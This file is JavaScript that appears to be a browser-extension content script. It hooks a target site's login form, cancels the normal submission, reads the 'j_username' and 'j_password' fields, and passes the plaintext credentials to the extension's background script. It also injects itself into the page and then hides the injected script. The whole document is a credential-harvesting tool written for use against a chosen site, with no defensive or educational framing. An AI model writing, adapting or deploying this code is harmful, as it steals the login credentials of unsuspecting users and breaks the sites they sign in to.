function captureCredentials() {
  const loginForm = document.querySelector('form'); // Adjust the selector based on your target login form

  if (loginForm) {
    loginForm.addEventListener('submit', function (event) {
      event.preventDefault();

      const usernameField = loginForm.querySelector('input[name="j_username"]'); // Adjust the selector for the username field
      const passwordField = loginForm.querySelector('input[name="j_password"]'); // Adjust the selector for the password field

      if (usernameField && passwordField) {
        const credentials = {
          username: usernameField.value,
          password: passwordField.value,
        };

        chrome.runtime.sendMessage({ type: 'credentials', credentials }, function (response) {
          console.log('Credentials sent to background script');
        });
      }

      // Remove the loginForm.submit() line; we don't need to submit the form manually
    });
  }
}

// Inject the content script into the web page
const script = document.createElement('script');
script.textContent = '(' + captureCredentials.toString() + ')();';
(document.head || document.documentElement).appendChild(script);
script.remove();